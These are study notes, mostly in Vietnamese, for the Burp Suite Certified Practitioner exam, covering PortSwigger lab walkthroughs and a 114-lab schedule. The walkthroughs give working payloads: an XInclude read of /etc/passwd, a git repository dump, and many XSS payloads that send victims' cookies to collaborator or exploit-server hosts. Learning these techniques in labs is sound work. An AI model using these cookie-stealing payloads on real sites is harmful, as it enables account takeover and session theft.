---
title: "BSCP"
description: "hành trình đến với chiếc cert thứ 2"
slug: "bscp"
menu:
    main:
        weight: 2
        params: 
            icon: user
---


![ ](image-1.png)

[Làm theo form này](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
# BSCP Lab Schedule — 1 Lab/Ngày

---

## Scaning


### Focus Scanning
 

![ ](image-2.png)
click như trên để scan 
![ ](image-3.png)
click vào dashboard để thấy được thông tin ; sau đó test bằng payload ở dưới để đọc passwd

![ ](image-4.png)
Payload : 
```code!
%3cfoo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"%3e%3cxi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/%3e%3c/foo
```

### Scanning non-standard data structures 

#### Bước 1 — Đăng nhập và quan sát session cookie
Đăng nhập với `wiener:peter`. Vào `Proxy` → `HTTP History`, tìm `request GET /my-account?id=wiener`.

Quan sát `cookie session`: Cookie chứa username ở dạng `cleartext`, theo sau là một `token`, phân tách bởi dấu hai chấm (`:`). Điều này gợi ý rằng ứng dụng xử lý giá trị `cookie` như hai input riêng biệt. PortSwigger
Ví dụ cookie trông như:`wiener:abc123tokenxyz`
Mục đích: Nhận ra rằng Burp Scanner mặc định sẽ coi toàn bộ cookie là một giá trị duy nhất, nên không thể phát hiện lỗ hổng nằm ở phần username. **Ta cần chỉ định insertion point thủ công**.

#### Bước 2 — Scan selected insertion point
Chọn (highlight) phần đầu tiên của session cookie — phần cleartext wiener. Click chuột phải chọn "Scan selected insertion point", rồi nhấn OK. PortSwigger
Mục đích: Thay vì scan toàn bộ cookie, ta chỉ đánh dấu phần username làm điểm chèn payload. Đây chính là kỹ thuật cốt lõi của bài lab — khi gặp cấu trúc dữ liệu không chuẩn, Burp Scanner sẽ coi toàn bộ chuỗi như một giá trị duy nhất và chèn payload sai vị trí. Bằng cách tự định nghĩa insertion point, ta có thể scan chính xác từng phần riêng biệt. PortSwigger

#### Bước 3 — Xem kết quả scan
Vào Dashboard, đợi khoảng 1 phút. Burp Scanner sẽ báo cáo một issue Cross-site scripting (stored). PortSwigger
Mở tab Request ở panel phía dưới để xem request mà Burp Scanner đã dùng để phát hiện lỗ hổng. Gửi request này sang Repeater.

#### Bước 4 — Craft payload XSS để lấy cookie admin
Vào tab Collaborator → Copy to clipboard để lấy Burp Collaborator domain.
Trong Repeater, dùng Inspector để xem cookie ở dạng decoded. Thay thế PoC của Burp bằng payload exfiltrate cookie:
```code!
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-TOKEN-PART
```
Lưu ý quan trọng:

Phần trước dấu : → payload XSS (thay thế cho username)
Phần sau dấu : → giữ nguyên session token hiện tại của bạn (không được xóa)
URL encode các ký tự đặc biệt nếu cần (dấu ', ", <, >, backtick)

Mục đích: Khi admin truy cập trang, payload XSS stored sẽ thực thi trong browser của admin, gửi cookie của admin đến Collaborator server của bạn.
![image](https://hackmd.io/_uploads/HJmaNVJp-x.png)

#### Bước 5 — Thu thập cookie admin
Nhấn Apply changes → Send trong Repeater.
Quay lại tab Collaborator, đợi khoảng 1 phút, nhấn `Poll now`. Collaborator server sẽ nhận được các tương tác DNS và HTTP mới PortSwigger — trong đó chứa cookie của admin được encode trong URL path.
Decode URL để lấy giá trị cookie admin.
![image](https://hackmd.io/_uploads/B1DMV4Ja-g.png)

#### Bước 6 — Truy cập admin panel và xóa carlos
Trong browser, mở DevTools (F12) → Application/Storage → Cookies. Thay thế session cookie hiện tại bằng cookie admin vừa lấy được.
Truy cập /admin panel → tìm và xóa user carlos → lab solved.
![image](https://hackmd.io/_uploads/rk0sXEJ6-l.png)

 

## CONTENT DISCOVERY

### Information disclosure in version control history
### Information disclosure in version control history 
```code!
wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt

ffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ
```
Cái này có vẻ dir của burp ; chỉ cần fuff để lấy thêm path thôi


![ ](image.png)
Chỉnh sửa như trên để vào discorver ; nó tương tự như fuff l nhưng có vẻ thông minh hơn bới có thể tìm nhiều cấp
![ ](image-5.png)
[Sau đây là dir mặc định của lab](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt)
![ ](image-6.png)
Chuyển sang tab control để xem quá trình chạy ; thời gian chạy là khá lâu -> có thể làm việc khác
![ ](image-7.png)

![ ](image-8.png)
Sau đó dùng python download về máy with script command : 
```code!
python -m git_dumper https://0af80073046599598378785800c000d3.web-security-academy.net/.git dumped 
```

![You can see admin password -> no i am was treated](image-9.png)

 

![](image-10.png)

Using `git log -p --all` to see history commit ; as the result i see actually password : `2e2l5mj2rtdq84xi11a7`

![Using this credential to login admin panel](image-11.png)

 

![delete carlos to solve this lab](image-12.png)

 

NOTE: always open source code to see some comment of dev ; it can reveal some hidden path or file and it can lead to symphony token deserialization.

---

## DOM-XSS

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

DOM base XSS xảy ra khi attacker lấy dữ liệu từ nguồn có thể kiểm soát truyền đoạn code đó đến 1 đoạn **sink** có thể thực thi mã js 
And we can using fuzz to check liệu rằng có thể escape được không

 
```code!
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer

>
<>
\'
\"
\'\"
'
"
'"
<script>
<script>fuzzer
</script>
<script></script>
{{7*7}}
{{fuzzer}}
$(alert(1)}
$(fuzzer}
${7*7}
${alert(1)}
"-prompt(69)-"
'-prompt(69)-'
"-alert(1)-"
'-alert(1)-'
-prompt(69)-
"fuzzer
'fuzzer
fuzzer
<fuzzer>
<script>{{7*7}}
{{7*7}}fuzzer
<script>alert(1)</script>
<script>prompt(69)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
"-alert(1)-"fuzzer
"><fuzzer>
<>"'
<>\'\"
<>"'<script>
<>"'<script>{{7*7}}
<>"'<script>{{7*7}}$(alert(1)}
<>"'<script>{{7*7}}$(alert(1)}"-prompt(69)-"
<>\'\"<script>{{7*7}}
<>\'\"<script>{{7*7}}$(alert(1)}
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"
{{7*7}}$(alert(1)}
{{7*7}}$(alert(1)}"-prompt(69)-"
$(alert(1)}"-prompt(69)-"
\'
\"
\
"><script>{{7*7}}</script>
'><script>{{7*7}}</script>
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('prompt(69)')()}}
"-{{7*7}}-"
'-{{7*7}}-'
"><svg>{{7*7}}</svg>
<svg>{{7*7}}</svg>
```
And we can check one by one 


```code!
document.write()
window.location
document.cookie
eval()
document.domain
WebSocket()
element.src
postMessage()
setRequestHeader()
FileReader.readAsText()
ExecuteSql()
sessionStorage.setItem()
document.evaluate()
JSON.parse
ng-app
URLSearchParams
replace()
innerHTML
location.search
addEventListener
sanitizeKey()
```
And review source code to find sink ; which may be lead to exploit 
![ ](image-14.png)

by the Dom Invader we can easy to find the sink ; and after let exploit 

![ ](image-15.png)
Ở đây ta exploit lỗ hỏng ở AngularJS bằng payload sau : 
```code!
{{$on.constructor('alert(1)')()}}
```
Mở rộng hơn thế là cướp cookie 
```code!
{{$on.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}
```
[Resource của paylaod trên được láy ở đây](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md)
hoặc [ở đây](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-(shorter))


###  DOM XSS in document.write sink using source location.search inside a select element

![ ](image-18.png)
The problem is sink kết hợp với source từ đó -> DOM XSS 

![ ](image-19.png)
WE can using invader dom to test xss

![ ](image-20.png)
And to escapse we using `">` ; and payload is : 
```code
"><svg onload=alert(1)>
```
And using the below to steal cookie 
```code
"></select><script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script>//
```
[Cookie stealer payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md)

![ ](image-21.png)
successfull escape 
![ ](image-22.png)
Get result 

### DOM XSS using web messages and JSON.parse

![ ](image-23.png)
Lab này cũng về DOM-XSS
![ ](image-25.png)
To exploit we using `iframe`
ok let exploit by DOM Invader 
![ ](image-24.png)
You can see payload was generated by Dom invader 


```code
<iframe id="lab" src="https://0af8004703512cc183e3e74000ce00ac.web-security-academy.net/"></iframe>

<script>
    const iframe = document.getElementById("lab");

    iframe.onload = () => {
        const payload = {
            type: "load-channel",
            url: "javascript:document.location=`https://929uubqroxp45rb1sn8ppd0tvk1bp3ds.oastify.com/?c=${document.cookie}`"
        };

        iframe.contentWindow.postMessage(JSON.stringify(payload), "*");
    };
</script>
```

![ ](image-26.png)
Waiting a few minute we see request to BurpCollaborator 


### DOM XSS using web messages and a JavaScript URL
![ ](image-27.png)

Trên đây là sink dẫn đến xss 

Payload sẽ như sau :

```code
<iframe 
    src="https://0ab700ba04713c16807244160075000e.web-security-academy.net/" 
    onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

Hoặc cướp cookie thì như sau 

```code
<iframe
    src="https://TARGET.net/"
    onload="this.contentWindow.postMessage(
        'javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie',
        '*'
    )">
</iframe>
```
![ ](image-28.png)


### DOM XSS using web messages

#### Source (nguồn dữ liệu không tin cậy)

- `e.data` trong event listener:
```code
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
});
```
- `e.data` đến từ `postMessage()`
- Vì attacker kiểm soát nội dung gửi qua `postMessage`, nên:
- Source = `e.data` (dữ liệu từ `postMessage`)
#### Sink (điểm thực thi nguy hiểm)
![ ](image-29.png)
- `document.getElementById('ads').innerHTML = e.data`
- using payload below to steal cookie
```code
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
```

### Reflected DOM XSS
![ ](image-31.png)
checking with dom invader we can see 1 sinks is eval ; let go to source code 
![ ](image-30.png)
using payload `\"-alert(1)}//` to exploit 

and using payload below to steal cookie 
```code
\"-fetch('https://OASTIFY.COM?reflects='+document.cookie)}//
```


### DOM-based cookie manipulation
![ ](image-32.png)
Ta có thể xác định đc source và dùng payload sau để escapse 
```code
1&'>tungdeptrai 
```
![ ](image-33.png)
Như vậy đã escape thành công 
![ ](image-34.png)
Như kết 1 điều tất yếu alert thành công với 
```code
1&%27><script>alert(1)</script>
```
![ ](image-35.png)

Sau đó window.location sẽ lưu toàn bộ url ; khi user load lại trang thì DOM Store sẽ thực hiện ; và lấy đc cookie 

Sử dụng payload như sau 

```code
<iframe src="https://0ab400260450e1bf80033fa300b1004b.web-security-academy.net/product?productId=1&'><script>fetch('https://exploit-0a7e009604c8e1df802d3eb801dc0076.exploit-server.net/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://0ab400260450e1bf80033fa300b1004b.web-security-academy.net/';window.x=1;">
</iframe>
```

![ ](image-36.png)

Log từ server của attker khi user reload lại trang product=1  => lấy được cookie 

---

## CROSS SITE SCRIPTING (XSS)

###  Reflected XSS into HTML context with most tags and attributes blocked
Để xác định các tag allow or deny 

Có thể thử các payload sau để nhận về các phản hồi http

```code
<img src=1 onerror=alert(1)>

"><svg><animatetransform onbegin=alert(1)>

<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```
Sau đó ta tiền hành fuzz ; lưu ý có thể fuzz tag tuy nhiên ở đây mình sẽ fuzz events 

Đổi search thành 

```code
<body%20$$=1>
```

[Sau đó vào trang sau để cop các event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 

![ ](image-37.png)

Có 1 vài tag trả về lỗi ; ta sẽ có url paylaod như sau 

```code
?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

hoặc 

?search=%22%3E%3Cbody%20onpopstate=print()>
```
Đưa thẻ iframe vào and send to victim

```code
<iframe src="https://0ace00f5048b2f61800280f600a1003a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E%22%20onload=this.style.width=%27100px%27%3E" onload=this.style.width='100px'>
```
Đoạn code dưới đây cũng là payload có thể tham khảo 
```code
<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>"></iframe>
```
### Reflected XSS with some SVG markup allowed


This case is missing SVG tag 

Khi phát hiện svg tag trả về 200 tiến hành fuzz như sau 

```code
<svg><animatetransform%20§§=1>
```

[Payload copy event ở](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 

Onbegin ok 

Payload như sau 

```code
https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E


khi gửi đến victim đưa vào iframe 

<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
</iframe>
```

![ ](image-38.png)



### Reflected XSS into HTML context with nothing encoded

Test XSS trong hoàn cảnh chức năng search không được encode đúng cách 

Gán giao thức `javascript` với  `location.protocal` là 1 thuộc tính của đối tượng `window.location`

`javascript` là 1 giao thức đặc biệt có thể thực thi được mã code 

`%0a` đại diện kí tự xuống dòng trong ASCII 

![ ](image-39.png)


### Reflected XSS into HTML context with all tags blocked except custom ones

Bài này phải custom tag thì mới xss đc; Payload như sau

```code
<xss+id=x>#x';
```

Payload lúc sau đưa sự kiện `onfocus` vào và `trigger` sự kiện `document.location` 

Kí tự hash `#` đặt cuối `url` khiến cho việc tập trung xử lí phần tử ngay khi page được load 

Payload lúc sau 

```code!
<script>
location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```
![ ](image-40.png)
### DOM XSS in jQuery selector sink using a hashchange event

Payload dưới đây dùng `#` ở cuối url để trigger sự kiện OnHashChange của XSS 

```code
<iframe src="https://TARGET.net/#" onload="document.location='http://OASTIFY.COM/?cookies='+document.cookie"></iframe>
```

**Lưu ý** : Nếu cookie được set HTTPOnly thì k thể bị steal 

Payload sau perform skill print 

```code
<iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

Tồn tại vul trong jquery 1.8.2 liên quan đến việc CSS selector thực thi sự kiện hashchange

![ ](image-41.png)



- [ ] **3/5** — Reflected XSS into a JavaScript string with single quote and backslash escaped
![ ](image-42.png)

Quan sát thấy biến `searchTerms` được reflect trong source code 
 

![ ](image-43.png)

Test payload với `test'payload`  ta nhận được `\` để escape khỏi việc breaking chuỗi 

Sử dụng payload sau 

```code
</script><script>alert(1)</script>
```

Paylaod sau để cướp cookie

```code
</script><script>document.location="https://OASTIFY.COM/?cookie="+document.cookie</script>
```

Trong khi thi dùng payload sau để host lên server và gửi cho victim 

```code
<script>
location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
</script>

```

Nếu `script` bị chặn thì dùng `ScRiPt`


### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

![ ](image-44.png)

Ta thấy context bị escape bới payload  `tung\'tung`

Và sau đây là 1 vài payload có thể dùng để chèn vào biến search 

```code
\'-alert(1)//  

fuzzer\';console.log(12345);//  

fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
```
![ ](image-46.png)
Sử dùng back stick để đóng gói url

```code
\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
```

![ ](image-45.png)


### Reflected XSS with AngularJS sandbox escape without strings

Lab này xây dựng trong môi trường AngularJS 1.4.4

Khi mà `eval` không còn tác dụng XSS đối với AngularJS 1.4.4

![ ](image-47.png)

Điểm đặc biệt khi xử lí biến `search`

![ ](image-48.png)

Test bằng việc thêm 1 key nữa và giá trị render không còn là giá trị search 

![ ](image-49.png)

Check bằng `7*7` để xem nó có thực thi không

Tuy nhiên khi thay payload chưa eval thì không được 

Đây là payload thay thế 

```code
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Các dãy số `120,61,97,108,101,114,116,40,49,41` đại diện cho kí tự ASCII : `x=alert(1)`

[Và để cướp cookie dùng payload sau](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings))

```code
x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)
```

Tương ứng với 

```code
120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
```

Dùng đoạn code sau để chuyển đối text sang ASCII

```code
import sys

print('Python String to ASCII Converter!')
if len(sys.argv) != 2:
    print("Usage: Python ascii_converter.py 'Payload_String'")
    sys.exit(1)

input_string = sys.argv[1]
ascii_values = [str(ord(char)) for char in input_string]

output = ",".join(ascii_values)
print(output)
print('PortSwigger Expert Academy Labs!')
```
![ ](image-50.png)



- [ ] **6/5** — Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
- [ ] **7/5** — Practice Exam Stage 1 — XSS via JSON into EVAL
- [ ] **8/5** — Exploiting cross-site scripting to steal cookies (Stored XSS)
- [ ] **9/5** — Exploiting DOM clobbering to enable XSS
- [ ] **10/5** — Stored DOM XSS

---

## WEB CACHE POISONING

- [ ] **11/5** — Web cache poisoning with an unkeyed header
- [ ] **12/5** — Web cache poisoning via an unkeyed query parameter
- [ ] **13/5** — Parameter cloaking
- [ ] **14/5** — Web cache poisoning via ambiguous requests
- [ ] **15/5** — Web cache poisoning with multiple headers
- [ ] **16/5** — Web cache poisoning via a fat GET request

---

## HOST HEADERS

- [ ] **17/5** — Password reset poisoning via middle-ware
- [ ] **18/5** — Host validation bypass via connection state attack

---

## HTTP REQUEST SMUGGLING

- [ ] **19/5** — HTTP request smuggling, obfuscating the TE header
- [ ] **20/5** — Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL
- [ ] **21/5** — Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE
- [ ] **22/5** — Exploiting HTTP request smuggling to capture other users' requests
- [ ] **23/5** — Exploiting HTTP request smuggling to deliver reflected XSS
- [ ] **24/5** — HTTP/2 request smuggling via CRLF injection
- [ ] **25/5** — Response queue poisoning via H2.TE request smuggling

---

## BRUTE FORCE

- [ ] **26/5** — Brute-forcing a stay-logged-in cookie
- [ ] **27/5** — Offline password cracking
- [ ] **28/5** — Username enumeration via response timing
- [ ] **29/5** — Username enumeration via subtly different responses
- [ ] **30/5** — Username enumeration via different responses

---

## AUTHENTICATION

- [ ] **31/5** — Inconsistent handling of exceptional input
- [ ] **1/6** — Infinite money logic flaw (Burp Macro)

---

## CSRF — ACCOUNT TAKEOVER

- [ ] **2/6** — Forced OAuth profile linking
- [ ] **3/6** — CSRF with broken Referer validation
- [ ] **4/6** — CSRF where Referer validation depends on header being present
- [ ] **5/6** — CSRF where token is tied to non-session cookie
- [ ] **6/6** — CSRF where token is duplicated in cookie
- [ ] **7/6** — CSRF where token validation depends on token being present
- [ ] **8/6** — CSRF vulnerability with no defences
- [ ] **9/6** — SameSite Strict bypass via sibling domain
- [ ] **10/6** — SameSite Lax bypass via cookie refresh

---

## PASSWORD RESET

- [ ] **11/6** — Password reset broken logic
- [ ] **12/6** — Weak isolation on dual-use endpoint
- [ ] **13/6** — Exploiting time-sensitive vulnerabilities

---

## SQL INJECTION

- [ ] **14/6** — Blind SQL injection with time delays and information retrieval
- [ ] **15/6** — Blind SQL injection with out-of-band data exfiltration
- [ ] **16/6** — Blind SQL injection with out-of-band interaction
- [ ] **17/6** — Blind SQL injection with conditional responses
- [ ] **18/6** — SQL injection attack, listing the database contents on Oracle
- [ ] **19/6** — SQL injection attack, listing the database contents on non-Oracle databases
- [ ] **20/6** — Visible error-based SQL injection
- [ ] **21/6** — SQL injection with filter bypass via XML encoding

---

## JWT

- [ ] **22/6** — JWT authentication bypass via jwk header injection
- [ ] **23/6** — JWT authentication bypass via weak signing key
- [ ] **24/6** — JWT authentication bypass via kid header path traversal
- [ ] **25/6** — JWT authentication bypass via jku header injection

---

## PROTOTYPE POLLUTION

- [ ] **26/6** — Client-side prototype pollution in third-party libraries
- [ ] **27/6** — Privilege escalation via server-side prototype pollution

---

## API TESTING

- [ ] **28/6** — Exploiting a mass assignment vulnerability
- [ ] **29/6** — Exploiting server-side parameter pollution in a query string

---

## ACCESS CONTROL

- [ ] **30/6** — User role can be modified in user profile
- [ ] **1/7** — Authentication bypass via flawed state machine
- [ ] **2/7** — URL-based access control can be circumvented
- [ ] **3/7** — Authentication bypass via information disclosure

---

## GRAPHQL API

- [ ] **4/7** — Finding a hidden GraphQL endpoint
- [ ] **5/7** — Accidental exposure of private GraphQL fields
- [ ] **6/7** — Bypassing GraphQL brute force protections

---

## CORS

- [ ] **7/7** — CORS vulnerability with trusted insecure protocols
- [ ] **8/7** — CORS vulnerability with trusted null origin

---

## XXE INJECTIONS

- [ ] **9/7** — Exploiting XInclude to retrieve files
- [ ] **10/7** — Exploiting blind XXE to exfiltrate data using a malicious external DTD
- [ ] **11/7** — Exploiting blind XXE to retrieve data via error messages
- [ ] **12/7** — SQL injection with filter bypass via XML encoding (XXE + SQLi + HackVertor)
- [ ] **13/7** — Exploiting XXE to perform SSRF attacks
- [ ] **14/7** — Exploiting XXE via image file upload

---

## SSRF

- [ ] **15/7** — SSRF with blacklist-based input filter
- [ ] **16/7** — SSRF via flawed request parsing
- [ ] **17/7** — SSRF via OpenID dynamic client registration
- [ ] **18/7** — Routing-based SSRF
- [ ] **19/7** — SSRF with filter bypass via open redirection vulnerability

---

## SSTI

- [ ] **20/7** — Basic server-side template injection (code context) — Tornado
- [ ] **21/7** — Server-side template injection with information disclosure via user-supplied objects — Django
- [ ] **22/7** — Server-side template injection using documentation — Freemarker
- [ ] **23/7** — Basic server-side template injection — ERB
- [ ] **24/7** — Server-side template injection in an unknown language — Handlebars

---

## SSPP

- [ ] **25/7** — Remote code execution via server-side prototype pollution

---

## FILE PATH TRAVERSAL

- [ ] **26/7** — File path traversal, traversal sequences blocked with absolute path bypass
- [ ] **27/7** — File path traversal, traversal sequences stripped non-recursively
- [ ] **28/7** — File path traversal, traversal sequences stripped with superfluous URL-decode
- [ ] **29/7** — File path traversal, validation of start of path
- [ ] **30/7** — File path traversal, validation of file extension with null byte bypass

---

## FILE UPLOADS

- [ ] **31/7** — Web shell upload via path traversal
- [ ] **1/8** — Web shell upload via obfuscated file extension
- [ ] **2/8** — Remote code execution via polyglot web shell upload
- [ ] **3/8** — Web shell upload via extension blacklist bypass
- [ ] **4/8** — Web shell upload via Content-Type restriction bypass
- [ ] **5/8** — Web shell upload via race condition

---

## DESERIALIZATION

- [ ] **6/8** — Arbitrary object injection in PHP
- [ ] **7/8** — Exploiting Java deserialization with Apache Commons
- [ ] **8/8** — Exploiting PHP deserialization with a pre-built gadget chain

---

## OS COMMAND INJECTION

- [ ] **9/8** — Blind OS command injection with out-of-band data exfiltration
- [ ] **10/8** — Blind OS command injection with output redirection

---

> **Tổng: 114 labs | 20/4 → 10/8 (112 ngày)**